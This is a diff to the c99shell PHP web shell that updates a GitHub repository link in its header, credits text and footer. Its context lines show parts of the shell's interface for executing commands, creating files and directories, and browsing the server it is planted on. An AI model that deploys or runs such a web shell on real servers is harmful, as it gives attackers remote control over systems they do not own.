@@ -10,7 +10,7 @@ _/ ___\____    /\____    /  \_____  \ |  |  \_/ __ \|  | |  |   \  \/ /   /  ___
                                       
 *  c99shell.php v.2.1 (PHP 7) (1.12.2019) Updated by: KaizenLouie for PHP 7, and cermmik for MySQL
 *  https://github.com/KaizenLouie/C99Shell-PHP7
-*  https://github.com/cermmik/C99-Shell
+*  https://github.com/cermmik/C99-WebShell
 *************************************************************************************************************
 */
 
@@ -4961,7 +4961,7 @@ else
 }
 if ($act == "about")
 {
-    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell,<br><br><u>KaizenLouie</u> for Latest safe-build and update for PHP 7, and <u>cermmik</u> for MySQL support.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/KaizenLouie/C99Shell-PHP7<br>for MySQL-related bugs create an issue in https://github.com/cermmik/C99-Shell </b>";
+    echo "<center><b>Credits:<br><br>Kudos to the &quot;Original Creators&quot; of C99Shell,<br><br><u>KaizenLouie</u> for Latest safe-build and update for PHP 7, and <u>cermmik</u> for MySQL support.<br><br>Thanks to all who reported the bugs.<br>If there are more bugs, please create an issue in https://github.com/KaizenLouie/C99Shell-PHP7<br>for MySQL-related bugs create an issue in https://github.com/cermmik/C99-WebShell </b>";
 } ?>
 </td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
 <tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Command execute</b></a> ::</b></p></td></tr>
@@ -4978,7 +4978,7 @@ if ($act == "about")
 </table>
 <br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><?php echo $wdt; ?></form></center></td></tr></table>
 <br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form action="<?php echo $surl; ?>"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type="text" name="f" size="50" value="<?php echo $dispd; ?>">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v.<?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> KaizenLouie and <a href="<?php echo $surl; ?>act=about"><u><b>updated by</b></u></a> cermmik | <a href="https://github.com/KaizenLouie/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> (<a href="https://github.com/cermmik/C99-Shell">MySQL update</a>) | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
+<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v.<?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> KaizenLouie and <a href="<?php echo $surl; ?>act=about"><u><b>updated by</b></u></a> cermmik | <a href="https://github.com/KaizenLouie/C99Shell-PHP7"><font color="#FF0000">C99Shell Github</font></a><font color="#FF0000"></font> (<a href="https://github.com/cermmik/C99-WebShell">MySQL update</a>) | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
 </body></html><?php chdir($lastdir);
 
 c99shexit(); 
